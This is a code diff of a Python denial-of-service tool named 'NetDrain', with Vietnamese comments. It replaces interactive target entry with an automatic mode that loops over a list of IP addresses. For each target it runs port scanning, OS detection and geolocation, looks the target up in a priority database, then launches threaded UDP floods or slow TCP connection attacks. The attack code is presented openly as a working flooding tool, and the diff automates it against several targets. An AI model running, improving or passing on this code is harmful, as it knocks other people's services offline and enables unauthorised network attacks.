@@ -57,6 +57,7 @@ target_database = {
 
 def log(msg):
     print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+
 def udp_drain(ip, port, packet_size):
     data = random._urandom(packet_size)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -84,7 +85,6 @@ def start_attack(ip, port, method, duration, rq):
     log(f"[~] Starting attack on {ip}:{port} | Method: {method.upper()} | Threads: {rq} | Duration: {duration}s")
     for i in range(rq):
         if method.lower() == "udp":
-            # Dùng packet 1400B và delay cực ngắn để hút băng thông
             t = threading.Thread(target=udp_drain, args=(ip, port, 1400), daemon=True)
         elif method.lower() == "tcp":
             t = threading.Thread(target=tcp_slow, args=(ip, port, 0.5), daemon=True)
@@ -92,7 +92,7 @@ def start_attack(ip, port, method, duration, rq):
             log(f"[!] Unknown method '{method}'. Exiting.")
             sys.exit(1)
         t.start()
-        time.sleep(0.005)  
+        time.sleep(0.005)
 
     while time.time() < end_time:
         remaining = int(end_time - time.time())
@@ -100,26 +100,8 @@ def start_attack(ip, port, method, duration, rq):
         time.sleep(5)
     log("[✓] Attack time is over. Exiting...")
 
-def interactive_input():
-    target_ip = input("Target(IP): ").strip()
-    port_input = input("Port: ").strip()
-    method = input("Method (udp/tcp): ").strip().lower()
-    duration_input = input("Time (seconds): ").strip()
-    rq_input = input("Rq (number of threads): ").strip()
-
-    # Kiểm tra và ép kiểu dữ liệu đầu vào
-    try:
-        port = int(port_input)
-        duration = int(duration_input)
-        rq = int(rq_input)
-    except ValueError:
-        print("[!] Input error: Port, Time, and Rq must be numbers.")
-        sys.exit(1)
-
-    return target_ip, port, method, duration, rq
-
-def main():
-    print("=== Ngzz Dat NetDrain Interactive Shell ===")
+def auto_mode():
+    print("=== NetDrain Auto Mode ===")
     print("""
    ____             _       _         _          
   |  _ \  __ _ _ __(_) __ _| |__  ___| |_ _   _  
@@ -127,17 +109,30 @@ def main():
   | |_| | (_| | |  | | (_| | | | \__ \ |_| |_| | 
   |____/ \__,_|_|  |_|\__, |_| |_|___/\__|\__, | 
                       |___/              |___/  
-        NetDrain Interactive v2.0 by Ngzz Dat
+        NetDrain Auto v2.0 by Ngzz Dat
     """)
-    target_ip, port, method, duration, rq = interactive_input()
 
-    get_target_info(target_ip)
-    scan_ports(target_ip)
-    resolve_dns(target_ip)
-    detect_os(target_ip)
-    geoip_lookup(target_ip)
+    # --- Cấu hình mặc định cho mỗi mục tiêu ---
+    default_port = 80
+    default_method = "udp"
+    default_duration = 15  # giây
+    default_threads = 10
 
-    start_attack(target_ip, port, method, duration, rq)
+    for ip in ip_list:
+        log(f"[*] Bắt đầu kiểm tra mục tiêu {ip}")
+        get_target_info(ip)
+        scan_ports(ip)
+        resolve_dns(ip)
+        detect_os(ip)
+        geoip_lookup(ip)
+
+        if ip in target_database:
+            info = target_database[ip]
+            log(f"[i] Tìm thấy trong database - Trạng thái: {info['status']}, Độ ưu tiên: {info['rating']}")
+
+        start_attack(ip, default_port, default_method, default_duration, default_threads)
+        log(f"[✓] Hoàn tất với {ip}. Nghỉ trước khi tiếp tục...\n")
+        time.sleep(5)
 
 if __name__ == "__main__":
-    main()
+    auto_mode()
